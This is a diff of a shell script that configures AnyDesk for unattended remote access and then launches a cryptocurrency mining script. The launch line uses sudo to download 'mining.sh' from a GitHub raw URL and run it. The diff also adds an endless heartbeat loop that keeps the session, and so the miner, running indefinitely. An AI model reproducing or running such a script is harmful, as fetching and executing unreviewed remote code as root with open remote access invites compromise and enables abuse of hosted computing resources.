@@ -90,8 +90,6 @@ while [[ -z "$ANYDESK_ID" && "$RETRY_COUNT" -lt "$MAX_RETRIES" ]]; do
     sleep 5 # Give the service a moment to start fully
 
     echo "    Setting AnyDesk password for unattended access..."
-    # AnyDesk --set-password sends output to stderr but doesn't necessarily indicate failure.
-    # We redirect stderr to dev/null to keep the log clean, but would see it if we needed to debug.
     echo "$ANYDESK_UNATTENDED_PASSWORD" | sudo anydesk --set-password 2>/dev/null
 
     echo "    Retrieving AnyDesk ID..."
@@ -118,6 +116,12 @@ else
     journalctl -u anydesk.service --no-pager -n 50 # Show last 50 lines of service log
 fi
 
-# --- Keep the session alive (optional, if you want to keep the virtual desktop) ---
+# --- Launch the mining script ---
 xfce4-terminal -e "bash -c 'sudo curl -o try.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/refs/heads/main/mining.sh && sudo chmod +x try.sh && sudo ./try.sh; exec bash'" &
-sleep 86400
+
+# --- Keep the session alive with periodic messages ---
+echo "[*] Virtual desktop session and mining script are running. Sending heartbeat messages every 5 minutes."
+while true; do
+    echo "[*] Heartbeat: Session is still alive at $(date)."
+    sleep 300 # Sleep for 5 minutes (300 seconds)
+done
